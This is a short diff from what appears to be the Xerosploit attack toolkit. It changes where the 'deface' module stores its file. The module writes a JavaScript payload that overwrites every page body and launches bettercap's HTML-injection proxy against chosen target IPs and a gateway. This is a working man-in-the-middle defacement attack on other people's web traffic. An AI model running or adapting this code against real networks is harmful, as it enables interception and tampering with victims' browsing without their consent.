@@ -771,11 +771,12 @@ def main():
 
 									
 									content = """<script type='text/javascript'> window.onload=function(){document.body.innerHTML = " """ + file_deface + """ ";}</script>"""
-									f1 = open('/home/home/xero-html.html','w')
+									make_directory = os.system("mkdir -p /opt/xerosploit/xerodeface")
+									f1 = open('/opt/xerosploit/xerodeface/xero-html.html','w')
 									f1.write(content)
 									f1.close()
 
-									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I " + up_interface + " --gateway " + gateway )
+									cmd_inject = os.system("xettercap " + target_parse + target_ips + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /opt/xerosploit/xerodeface/xero-html.html -I " + up_interface + " --gateway " + gateway )
 									deface()
 							else:
 								print("\033[1;91m\n[!] Error : Command not found.\033[1;m")
